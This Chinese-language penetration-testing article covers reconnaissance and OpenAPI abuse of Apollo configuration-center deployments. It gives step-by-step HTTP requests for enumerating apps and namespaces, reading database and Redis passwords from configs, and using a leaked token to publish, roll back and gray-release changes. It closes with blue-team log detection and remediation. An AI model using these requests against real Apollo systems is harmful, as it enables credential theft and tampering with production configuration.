---
title: "Apollo配置中心管理面打点与OpenAPI利用技术"
date: 2026-06-15T20:49:11+08:00
draft: false
weight: 65
description: "围绕Apollo配置中心相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "配置中心", "Apollo", "OpenAPI"]
---

# Apollo配置中心管理面打点与OpenAPI利用技术

`Apollo` 是典型的高价值配置控制平面。它不仅是“一个能看配置的后台”，而是把：

- 多环境配置
- 多集群差异配置
- Namespace 管理
- 发布、回滚与灰度发布
- OpenAPI 第三方接入
- 客户端长轮询通知
- 审计与变更历史

统一收敛到了同一套 Portal、ConfigService、AdminService 与 OpenAPI 体系中。

对攻击者来说，Apollo 的价值不在某一个页面，而在于它常常直接暴露：

- 数据库、Redis、MQ、云凭据
- 业务开关和灰度规则
- 环境与集群命名
- 管理员、发布人、发布历史
- 长轮询配置变更链路
- OpenAPI Token 与第三方自动化入口

一旦 Apollo 被公开暴露、Portal 认证弱、OpenAPI Token 泄露、历史版本存在权限绕过，或者某个低权限账号被授予了过宽的 Namespace 权限，攻击者通常可以在很短时间内回收：

- AppId、Env、Cluster、Namespace 结构
- 配置正文与历史版本
- 配置发布与回滚操作面
- 灰度发布规则
- 客户端变更通知关系

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Apollo
2. 如何区分 `Portal`、`ConfigService`、`AdminService` 与 `OpenAPI`
3. 如何围绕配置读取、Namespace 枚举、发布历史和灰度发布建立攻击价值判断
4. 哪些请求与响应最值得完整保留
5. 蓝队如何从访问日志、服务日志、客户端日志与审计能力识别这类打点

---

## 0. 攻击面概览

### 0.1 典型组件

Apollo 常见部署通常包含：

- `Portal`
- `ConfigService`
- `AdminService`
- `MetaServer`

这几个组件的打点意义不同：

- `Portal`：后台页面、开放平台、用户与发布入口
- `ConfigService`：客户端取配置、长轮询通知、灰度读取
- `AdminService`：Portal 背后的管理写操作服务
- `MetaServer`：服务发现与地址分发

### 0.2 常见路径

首轮至少应枚举：

- `/`
- `/config.html`
- `/apps`
- `/envs`
- `/openapi/v1/apps`
- `/openapi/v1/apps/{appId}/envclusters`
- `/openapi/v1/envs/{env}/apps/{appId}/clusters/{cluster}/namespaces`
- `/openapi/v1/envs/{env}/apps/{appId}/clusters/{cluster}/namespaces/{namespace}/items`
- `/openapi/v1/envs/{env}/apps/{appId}/clusters/{cluster}/namespaces/{namespace}/releases/latest`
- `/notifications/v2`
- `/configs/{appId}/{clusterName}/{namespaceName}`
- `/configfiles/json/{appId}/{clusterName}/{namespaceName}`

如果是典型客户端读取链，还要关注：

- `/configs/{appId}/{clusterName}/{namespaceName}?ip=...`
- `/configfiles/json/{appId}/{clusterName}/{namespaceName}?ip=...`
- `/notifications/v2?appId=...&cluster=...&notifications=...`

### 0.3 认证边界

Apollo 常见边界包括：

- Portal 登录会话
- OpenAPI `Authorization` Token
- App 级 AccessKey
- 环境、集群、Namespace 维度权限

从现实攻击面看，最常见的风险不是“完全未授权”，而是：

- OpenAPI Token 泄露
- 低权限用户能枚举不该看的配置
- 老版本 Portal 某些接口越权
- 配置读取面未通过外围网关做收敛

### 0.4 打点收益优先级

按“最快转成真实攻击价值”的顺序，Apollo 的打点收益一般可排为：

1. 确认是否为 Apollo，以及 Portal/ConfigService/OpenAPI 哪些面可达
2. 枚举 AppId、Env、Cluster、Namespace
3. 读取最新发布配置与配置正文
4. 枚举发布历史、回滚、灰度发布与评论信息
5. 判断是否存在 OpenAPI 写操作、历史越权问题或第三方 Token 泄露

---

## 1. 第一轮打点：确认是否为 Apollo

### 1.1 Portal 页面识别

#### 请求示例

```http
GET / HTTP/1.1
Host: apollo.target.example:8070
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
```

页面与前端资源中常见特征包括：

- `Apollo`
- `Config Management`
- `Portal`
- `Env`
- `Namespace`

### 1.2 `ConfigService` 读取接口识别

Apollo 客户端最核心的读取链之一是：

- `/configs/{appId}/{clusterName}/{namespaceName}`

#### 请求示例

```http
GET /configs/100004458/default/application?ip=10.20.41.27 HTTP/1.1
Host: apollo-config.target.example:8080
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "appId": "100004458",
  "cluster": "default",
  "namespaceName": "application",
  "configurations": {
    "timeout": "3000",
    "db.url": "jdbc:mysql://10.20.42.18:3306/payment",
    "db.user": "payment_app",
    "db.password": "Str0ngPass!2026"
  },
  "releaseKey": "20260616021549-6d12d9f0f74a4ea5",
  "dataChangeLastModifiedTime": "2026-06-16T02:15:49.235+0800"
}
```

这类响应几乎可以直接确认：

- 目标是 Apollo ConfigService
- 当前 `appId/cluster/namespace` 已发布
- 可直接读到配置正文

#### 典型失败响应示例

```text
Could not find config for namespace - appId: 100004458, cluster: default, namespace: application, please check whether the configs are released in Apollo!
```

这类失败同样有价值，因为它说明：

- 目标确实在跑 Apollo
- 当前 namespace 未发布或名称不对
- 后续更应继续枚举非默认 namespace，如 `application.yml`

### 1.3 `configfiles/json` 识别

#### 请求示例

```http
GET /configfiles/json/100004458/default/application?ip=10.20.41.27 HTTP/1.1
Host: apollo-config.target.example:8080
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "timeout": "3000",
  "feature.enablePaymentMock": "false",
  "db.url": "jdbc:mysql://10.20.42.18:3306/payment"
}
```

这个接口比 `/configs/...` 更适合直接消费配置正文，因为：

- 没有外围元数据包装
- 更适合自动化抓取

### 1.4 `notifications/v2`

Apollo 设计文档明确说明，客户端通过通知接口配合本地缓存与长轮询感知发布事件。

#### 请求示例

```http
GET /notifications/v2?appId=100004458&cluster=default&notifications=%5B%7B%22namespaceName%22%3A%22application%22%2C%22notificationId%22%3A-1%7D%5D HTTP/1.1
Host: apollo-config.target.example:8080
Accept: application/json
Connection: close
```

#### 典型有变更响应示例

```json
[
  {
    "namespaceName": "application",
    "notificationId": 2784,
    "messages": {
      "details": [
        {
          "key": "db.password"
        }
      ]
    }
  }
]
```

#### 典型无变更响应示例

```http
HTTP/1.1 304 Not Modified
```

这类接口的价值不只是“能看配置”，而是：

- 能感知哪些 namespace 正在变
- 能帮助推断哪些 key 最近活跃

---

## 2. 第二轮打点：OpenAPI 与命名空间画像

### 2.1 OpenAPI Token 模型

Apollo 开放平台文档明确说明：

- 调用 OpenAPI 时，需要在 Header 中加入 `Authorization`
- Token 由 Portal 中的开放平台管理页创建并授权
- Token 绑定到可以操作的 Namespace 范围

这意味着攻击面核心不是“爆破开放平台”，而是：

- 是否拿到了某个 OpenAPI Token
- Token 到底被授权了哪些 `appId/env/cluster/namespace`

### 2.2 查询 App 信息

#### 请求示例

```http
GET /openapi/v1/apps HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "payment-api",
    "appId": "100004458",
    "orgId": "development",
    "orgName": "研发部",
    "ownerName": "apollo",
    "ownerEmail": "apollo@test.com"
  }
]
```

这类返回可直接回收：

- AppId
- 应用名称
- 组织信息
- 负责人信息

### 2.3 获取环境与集群

#### 请求示例

```http
GET /openapi/v1/apps/100004458/envclusters HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "env": "DEV",
    "clusters": [
      "default"
    ]
  },
  {
    "env": "PRO",
    "clusters": [
      "default",
      "az1",
      "az2"
    ]
  }
]
```

这类返回对打点非常关键，因为它直接给出：

- 环境维度
- 集群维度
- 多 AZ 或多机房划分

### 2.4 列出 Namespace

#### 请求示例

```http
GET /openapi/v1/envs/PRO/apps/100004458/clusters/default/namespaces HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "appId": "100004458",
    "clusterName": "default",
    "namespaceName": "application",
    "name": "2026-06-16",
    "format": "properties",
    "items": [
      {
        "key": "timeout",
        "value": "3000"
      }
    ]
  },
  {
    "appId": "100004458",
    "clusterName": "default",
    "namespaceName": "payment-prod.yml",
    "format": "yaml"
  }
]
```

一旦这类接口可读，基本就能直接建立：

- namespace 结构
- 文件格式
- 默认 namespace 与自定义 namespace

### 2.5 查询 Item 列表

#### 请求示例

```http
GET /openapi/v1/envs/PRO/apps/100004458/clusters/default/namespaces/payment-prod.yml/items HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": 309135486247505920,
    "key": "db.password",
    "value": "Str0ngPass!2026",
    "comment": "prod database password"
  },
  {
    "id": 309135486247505921,
    "key": "redis.password",
    "value": "redis-prod-pass",
    "comment": "prod redis auth"
  }
]
```

---

## 3. 第三轮打点：发布、历史与灰度面

### 3.1 最新发布

开放平台文档明确给出了最新发布查询接口。

#### 请求示例

```http
GET /openapi/v1/envs/PRO/apps/100004458/clusters/default/namespaces/application/releases/latest HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "appId": "100004458",
  "clusterName": "default",
  "namespaceName": "application",
  "name": "2026-06-16",
  "configurations": {
    "timeout": "3000",
    "db.url": "jdbc:mysql://10.20.42.18:3306/payment",
    "db.user": "payment_app",
    "db.password": "Str0ngPass!2026"
  },
  "comment": "修改 timeout 与数据库配置",
  "dataChangeCreatedBy": "apollo",
  "dataChangeLastModifiedBy": "apollo",
  "dataChangeCreatedTime": "2026-06-16T02:15:49.232+0800",
  "dataChangeLastModifiedTime": "2026-06-16T02:15:49.235+0800"
}
```

这类响应的价值极高，因为它同时暴露：

- 配置正文
- 发布说明
- 发布人
- 发布时间

### 3.2 发布新配置

#### 请求示例

```http
POST /openapi/v1/envs/PRO/apps/100004458/clusters/default/namespaces/application/releases HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Content-Type: application/json;charset=UTF-8
Connection: close

{
  "releaseTitle": "2026-06-16 emergency publish",
  "releaseComment": "update payment endpoint",
  "isEmergencyPublish": false
}
```

#### 典型成功响应示例

```json
{
  "id": 920118,
  "releaseKey": "20260616024157-c34f12b2d3c947e0",
  "name": "2026-06-16 emergency publish"
}
```

一旦这类接口成功，风险已经从“读配置”升级为“主动控制配置发布链”。

### 3.3 回滚发布

#### 请求示例

```http
PUT /openapi/v1/envs/PRO/releases/920118/rollback HTTP/1.1
Host: apollo-portal.target.example:8070
Authorization: 7e3c0dbf1b854cc2bf6f35aa47bcbaf1
Connection: close
```

#### 典型成功响应示例

```json
{
  "appId": "100004458",
  "clusterName": "default",
  "namespaceName": "application",
  "releaseKey": "20260616024518-8b9320be43d84d83"
}
```

### 3.4 灰度发布

Apollo 官方功能描述明确指出：

- 支持灰度发布
- 可按集群、实例或规则向部分客户端放量

在 OpenAPI 场景中，这类能力意味着攻击者一旦拿到高权限 Token，除了全量配置篡改外，还可能：

- 只改一部分实例配置
- 做更隐蔽的定向干扰

### 3.5 发布历史保留与审计价值

Apollo 2.2.0 与之后的版本说明中还提到：

- 可配置发布历史保留数量
- 管理员可查看更细粒度审计日志

这对打点的意义是：

- 历史记录本身是高价值情报源
- 防守侧如果未开启或未保留足够多历史，会让调查难度显著上升

---

## 4. 第四轮打点：客户端通知链与真实读取路径

### 4.1 设计视角下的读取链

Apollo 设计文档明确说明：

1. 客户端向 `ConfigService` 请求 `appId/cluster/namespace` 的配置
2. `ConfigService` 若本地缓存无数据，会从 `ConfigDB` 读取
3. 发布时 `AdminService` 会写入 `ReleaseMessage`
4. `ConfigService` 轮询 `ReleaseMessage` 并通知客户端

这条链决定了打点时应优先观察两类面：

- 当前配置面
- 变更通知面

### 4.2 客户端取配置请求

#### 请求示例

```http
GET /configs/100004458/default/payment-prod.yml?ip=10.20.41.27 HTTP/1.1
Host: apollo-config.target.example:8080
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "appId": "100004458",
  "cluster": "default",
  "namespaceName": "payment-prod.yml",
  "configurations": {
    "db.url": "jdbc:mysql://10.20.42.18:3306/payment",
    "db.password": "Str0ngPass!2026",
    "redis.password": "redis-prod-pass"
  },
  "releaseKey": "20260616024157-c34f12b2d3c947e0"
}
```

### 4.3 客户端缓存文件读取思路

实际落地中，Apollo 客户端还经常会把本地缓存落到文件系统。对红队和应急侧都要注意：

- 应用主机
- 容器挂载目录
- Java SDK 默认缓存路径

这些位置常会残留：

- `appId`
- `cluster`
- `namespace`
- 最近一次拉取到的配置正文

### 4.4 客户端失败日志也很有价值

Apollo issue 与真实客户端日志中常见的失败模式包括：

#### 日志示例

```text
Load Apollo Config failed - appId: 100004458, cluster: default, namespace: application, url: http://apollo-config.target.example:8080/configs/100004458/default/application?ip=10.20.41.27 [Cause: [status code: 404] Could not find config for namespace - appId: 100004458, cluster: default, namespace: application, please check whether the configs are released in Apollo!]
```

这类日志能帮助攻击者与蓝队同时判断：

- 客户端到底在拉哪些 namespace
- 某些默认 namespace 是否仍被引用
- 配置是否已发布

---

## 5. 高危错误部署场景

### 5.1 OpenAPI Token 泄露

Apollo 开放平台设计决定了第三方系统通常会持有一个长期 Token。现实中最常见的泄露点包括：

- CI/CD 变量
- 运维脚本
- 发布平台配置
- 应用日志
- README 或 Wiki

一旦该 Token 被授权到高价值 namespace，打点会立即升级为配置读取甚至发布控制。

### 5.2 `ConfigService` 对低信任网络开放

哪怕没有 Portal 写权限，只要 `ConfigService` 被错误开放，攻击者仍然可以围绕：

- `/configs/...`
- `/configfiles/...`
- `/notifications/v2`

建立非常完整的配置与变更画像。

### 5.3 历史 Portal 越权问题

Apollo 官方安全公告 `GHSA-c6c3-h4f7-3962` / `CVE-2024-43397` 明确指出：

- `<2.3.0` 的 `apollo-portal`
- 在同步配置功能中存在权限检查绕过
- 可导致无权用户修改 namespace

这意味着在老版本环境中：

- 即使不是管理员
- 也不能简单把“有账号但权限低”视为低风险

### 5.4 低权限用户侧信息枚举

Apollo 2.0.0/2.0.1 的社区问题中还可见某些用户信息相关接口的越权争议，这类场景说明：

- 老版本 Portal 接口不应只凭 UI 权限感知来判断安全
- 仍要针对具体 REST 接口单独验证

### 5.5 灰度发布与非 Properties Namespace

Apollo 2.2.0 起明确支持：

- 非 properties namespace 灰度发布
- 更多历史版本保留

这会让攻击者在高权限场景下获得更细粒度的控制能力，尤其是：

- YAML / JSON 配置定向改写
- 部分客户端定向放量

---

## 6. 蓝队检测与处置

### 6.1 反向代理与访问日志

应重点识别对以下路径的连续访问：

- `/configs/*`
- `/configfiles/*`
- `/notifications/v2`
- `/openapi/v1/apps`
- `/openapi/v1/apps/*/envclusters`
- `/openapi/v1/envs/*/apps/*/clusters/*/namespaces`
- `/openapi/v1/envs/*/apps/*/clusters/*/namespaces/*/items`
- `/openapi/v1/envs/*/apps/*/clusters/*/namespaces/*/releases/latest`
- `/openapi/v1/envs/*/releases/*/rollback`

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:03:41:11 +0800] "GET /configs/100004458/default/application?ip=10.20.41.27 HTTP/1.1" 200 486 "-" "python-requests/2.32.3"
```

```text
10.10.10.21 - - [16/Jun/2026:03:41:14 +0800] "GET /openapi/v1/apps/100004458/envclusters HTTP/1.1" 200 122 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [16/Jun/2026:03:41:18 +0800] "POST /openapi/v1/envs/PRO/apps/100004458/clusters/default/namespaces/application/releases HTTP/1.1" 200 91 "-" "curl/8.7.1"
```

第三类日志应视为高优先级事件，因为它已经进入真实发布操作面。

### 6.2 Apollo 服务端日志

Apollo 版本说明与运维资料表明，`ConfigService`、`AdminService`、`Portal` 的日志在现代版本中统一收敛到 `/opt/logs`。调查时应重点关注：

- 配置读取
- 通知轮询
- 发布
- 回滚
- OpenAPI 调用
- 权限失败

#### 日志示例

```text
2026-06-16 03:41:22.108 INFO  NotificationControllerV2 - appId:100004458, cluster:default, notifications:[{"namespaceName":"application","notificationId":-1}]
```

#### 日志示例

```text
2026-06-16 03:41:25.441 INFO  ReleaseController - Release namespace success. appId=100004458, env=PRO, cluster=default, namespace=application, operator=apollo-openapi
```

#### 日志示例

```text
2026-06-16 03:41:27.093 WARN  PermissionValidator - permission denied. appId=100004458, env=PRO, cluster=default, namespace=payment-prod.yml, operator=dev-user
```

### 6.3 客户端日志

Apollo 客户端与 issue 资料显示，客户端通常会留下：

- 拉取配置成功/失败
- 404 namespace
- 长轮询变更
- 本地缓存回退

#### 客户端日志示例

```text
[03:41:28:112] [INFO] - com.ctrip.framework.apollo.internals.RemoteConfigLongPollService - Long polling response: namespace=application, notificationId=2784
```

#### 客户端日志示例

```text
[03:41:28:313] [INFO] - com.ctrip.framework.apollo.internals.RemoteConfigRepository - Loaded config for appId=100004458, cluster=default, namespace=application from http://apollo-config.target.example:8080/configs/100004458/default/application
```

### 6.4 审计日志与发布历史

Apollo 2.2.0 起强调了更详细的审计日志与历史能力。蓝队至少应确保：

- 发布人可追踪
- 回滚人可追踪
- 灰度发布对象可追踪
- OpenAPI Token 所属方可追踪

### 6.5 处置建议

发现 Apollo 管理面被打点后，应优先做：

1. 收敛 `Portal`、`ConfigService`、`AdminService` 到受控网络
2. 立即审查所有 OpenAPI Token 与 AccessKey，并轮换高风险 Token
3. 检查是否已有配置正文、历史配置和发布历史被导出
4. 检查是否已经发生异常发布、回滚或灰度发布
5. 升级低于 `2.3.0` 的 Portal，排查 `CVE-2024-43397`
6. 对高敏感 namespace 中的数据库、Redis、MQ、云凭据做联动轮换

长期建议：

- 不把 Apollo 暴露到公网
- 对 OpenAPI Token 按 namespace 最小授权
- 对 `/configs/*`、`/notifications/v2`、`/openapi/v1/*` 建立独立告警
- 定期审查发布历史、灰度规则与审计日志保留策略
- 避免在 Wiki、脚本、CI 中持久保存 OpenAPI Token

---

## 7. 复盘清单

### 7.1 红队侧

- 是否确认了 `Portal`、`ConfigService`、`OpenAPI` 哪些面可达
- 是否完成了 `appId/env/cluster/namespace` 的整体画像
- 是否读取了最新发布、配置正文与 Item 列表
- 是否验证了发布、回滚与灰度能力边界
- 是否检查了历史越权问题与 Token 泄露来源

### 7.2 蓝队侧

- 是否能识别从 `/configs/* -> /notifications/v2 -> /openapi/v1/*` 的连续访问链
- 是否能识别异常 OpenAPI Token 的使用
- 是否能把发布、回滚、灰度与对应操作人关联起来
- 是否知道哪些 Namespace 存放了高敏感凭据

### 7.3 应急侧

- 是否确认是否已有配置正文、历史版本与灰度规则被导出
- 是否确认是否已有异常发布或回滚发生
- 是否完成高风险 Token、AccessKey 与下游配置凭据轮换
- 是否完成老版本 Portal 与暴露网络面的收敛

---

## 8. 总结

`Apollo` 的真正风险，不只是“一个配置中心后台可访问”，而在于它会把：

- 配置正文
- 环境与集群差异
- Namespace
- 发布历史
- 灰度规则
- 客户端通知链
- OpenAPI 自动化能力

统一暴露给同一条管理平面。

对打点来说，更值得沉淀的方法学是：

- 先确认 `Portal`、`ConfigService`、`OpenAPI` 哪些面存在
- 再建立 `appId/env/cluster/namespace` 结构画像
- 再集中读取最新发布、Item 列表和通知链
- 最后判断发布、回滚、灰度与历史越权问题是否存在

只有把这些面串起来，才能把“Apollo 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [Apollo Design](https://github.com/apolloconfig/apollo/blob/master/docs/en/design/apollo-design.md)
- [Apollo 开放平台](https://github.com/apolloconfig/apollo/wiki/Apollo%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0)
- [Apollo Open API Platform](https://www.apolloconfig.com/#/en/portal/apollo-open-api-platform)
- [Apollo 2.2.0 Release](https://github.com/apolloconfig/apollo/releases/tag/v2.2.0)
- [Apollo 2.4.0 Release](https://github.com/apolloconfig/apollo/releases/tag/v2.4.0)
- [CVE-2024-43397 / GHSA-c6c3-h4f7-3962](https://github.com/apolloconfig/apollo/security/advisories/GHSA-c6c3-h4f7-3962)
- [Apollo V2.0.0, V2.0.1 Unauthorized access vulnerability #4684](https://github.com/apolloconfig/apollo/issues/4684)
- [Could not find config for namespace issue #4806](https://github.com/apolloconfig/apollo/issues/4806)
